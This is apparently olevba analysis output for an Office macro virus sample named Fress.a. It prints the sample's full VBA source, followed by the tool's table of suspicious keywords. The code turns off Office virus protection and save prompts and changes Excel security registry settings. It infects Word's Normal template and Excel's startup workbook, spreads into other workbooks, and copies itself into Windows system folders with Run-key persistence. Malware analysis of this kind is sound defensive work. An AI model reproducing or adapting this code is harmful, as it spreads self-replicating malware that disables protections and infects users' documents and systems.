olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Fress.a-3b93ca3f24ae51fbcf53459da36f36e725330873
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Fress.a-3b93ca3f24ae51fbcf53459da36f36e725330873 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'***
'
Sub Start()
    On Error Resume Next
If IsObject(WScript) Then
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then Set WordObj = CreateObject("Word.Application"): FlagUnload = True
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        NT.DeleteLines 1, NT.CountOfLines: NT.AddFromFile (WScript.ScriptFullName): NT.ReplaceLine 2, "'"
        If FlagUnload = True Then WordObj.Quit
        Set NT = Nothing: Set WordObj = Nothing

'       Set xlApp = CreateObject("Excel.Application")
'       Set FSO = CreateObject("Scripting.FileSystemObject")
'       If not FSO.FileExists(xlApp.Application.StartupPath + "\Book1.") Then
'       Set Book1Obj = xlApp.Workbooks.Add: Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.AddFromFile (WScript.ScriptFullName)
'       Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 2,"'"
'       Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
'       End If
'       xlApp.Quit:Set FSO=Nothing
End If
MsgBox "@"
End Sub
Private Sub Document_Open()
        On Error Resume Next
        Application.Options.VirusProtection = False: Application.Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
        Set AD = Application.ActiveDocument.VBProject.VBComponents(1).CodeModule: Set NT = Application.NormalTemplate.VBProject.VBComponents(1).CodeModule
        If InStr(NT.Lines(1, 1), "***") = 0 Then
        NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
        ElseIf InStr(AD.Lines(1, 1), "***") = 0 Then
        AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
        End If
        Set xlApp = CreateObject("Excel.Application")
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
        System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
        Set fso = CreateObject("Scripting.FileSystemObject")
        If Not fso.FileExists(xlApp.Application.StartupPath + "\Book1.") Then
        Set Book1Obj = xlApp.Workbooks.Add: Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
        Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
        End If
        xlApp.Quit: Set fso = Nothing
End Sub
Private Sub Workbook_Deactivate()
        On Error Resume Next
        Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
        Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then Set WordObj = CreateObject("Word.Application"): FlagUnload = True
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        NT.DeleteLines 1, NT.CountOfLines: NT.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        If FlagUnload = True Then WordObj.Quit
        Set NT = Nothing: Set WordObj = Nothing
        Set xlApp = CreateObject("Excel.Application")
        Set fso = CreateObject("Scripting.FileSystemObject")
        If Not fso.FileExists(xlApp.Application.StartupPath + "\Book1.") Then
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Book1Obj.SaveAs Application.StartupPath & "\Book1.", xlNormal, , , , , , , False
        xlApp.Quit: Set fso = Nothing
        End If
        If InStr(AW.Lines(1, 1), "***") = 0 Then AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
End Sub
Sub IC()
        'On Error Resume Next
        extension = CreateExtension
        If ActiveDocument <> "" Then
        End If
        If ActiveWorkbook <> "" Then
        End If
        If IsObject(WScript) Then
        End If

        Set WindowsScriptShell = CreateObject("WScript.Shell")
        Set fso = CreateObject("Scripting.FileSystemObject")
        WindowsDir = fso.GetSpecialFolder(0)
        WindowsSystemDir = fso.GetSpecialFolder(1)

        MySelf.Copy (WindowsSystemDir & "\" & MyNewName & extension)
        MySelf.Copy (WindowsDir & "\" & MyNewName & extension)
        Set NewCopy = fso.OpenTextFile(WindowsSystemDir & "\" & CopyToSend, 2, True)
        NewCopy.write Transform
        NewCopy.Close
        CreateReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & MyNewName, WindowsSystemDir & "\" & MyNewName & extension
        CreateReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & MyNewName, WindowsDir & "\" & MyNewName & extension
End Sub
Sub CreateReg(regkey, regvalue)
        On Error Resume Next
        Set regedit = CreateObject("WScript.Shell")
        regedit.RegWrite regkey, regvalue
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Fress.a-3b93ca3f24ae51fbcf53459da36f36e725330873 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Fress.a-3b93ca3f24ae51fbcf53459da36f36e725330873 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Fress.a-3b93ca3f24ae51fbcf53459da36f36e725330873 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSOffice.Fress.a-3b93ca3f24ae51fbcf53459da36f36e725330873 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSOffice.Fress.a-3b93ca3f24ae51fbcf53459da36f36e725330873 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSOffice.Fress.a-3b93ca3f24ae51fbcf53459da36f36e725330873 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - 20, reserved bits not zero: 0x20 visible -        
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

